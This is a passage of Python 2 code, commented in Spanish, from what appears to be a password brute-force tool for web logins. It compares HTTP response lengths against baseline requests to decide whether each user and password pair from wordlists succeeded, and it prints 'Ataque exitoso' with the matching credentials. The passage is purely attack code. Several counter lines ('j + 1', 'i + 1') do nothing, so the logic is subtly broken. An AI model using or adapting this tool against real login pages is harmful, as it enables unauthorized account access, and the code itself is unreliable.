				if int(len(reqadm2.content)) - 1 == int(len(reqadm1.content)) and int(len(reqadm3.content)) -2 == int(len(reqadm1.content)): # Si en la respuesta devuelve el nombre de usuario
					if int(len(r.content)) - int(len(users[i])-1) == int(len(reqadm1.content)) and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Ataque no exitoso ', 'red')
						elif int (verbose) == 2:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						elif int(verbose) == 3:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Ataque exitoso ', 'green')
						elif int(verbose) == 2:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						elif int(verbose) == 3:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')

						
						j + 1
						
				elif int(len(reqadm1.content)) == int(len(reqadm2.content)) and int(len(reqadm1.content)) == int(len(reqadm3.content)): # Si el Content-Lenght es igual
					if int(len(r.content)) == int(len(reqadm1.content)) and mbefore in r.content:
						if int(verbose) == 1:
							print colored('Ataque no exitoso ', 'red')
						elif int (verbose) == 2:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						elif int(verbose) == 3:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
						j + 1
					else:
						if int(verbose) == 1:
							print colored('Ataque exitoso ', 'green')
						elif int(verbose) == 2:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						elif int(verbose) == 3:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')
						j + 1	
				else: # Si no se puede determinar mediante content-lenght
					if mbefore in r.text:
						if int(verbose) == 1:
							print colored('Ataque no exitoso ', 'red')
						elif int (verbose) == 2:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow')
						elif int(verbose) == 3:
							print colored('Ataque no exitoso con: ', 'red') + 'User: ' + colored(users[i].rstrip('\n'),'yellow') + ' Password: ' + colored(passwords[j].rstrip('\n'),'yellow')
					else:
						if int(verbose) == 1:
							print colored('Ataque exitoso ', 'green')
						elif int(verbose) == 2:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue')
						elif int(verbose) == 3:
							print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(users[i].rstrip('\n'),'blue') + ' Password: ' + colored(passwords[j].rstrip('\n'),'blue')	
		i + 1	
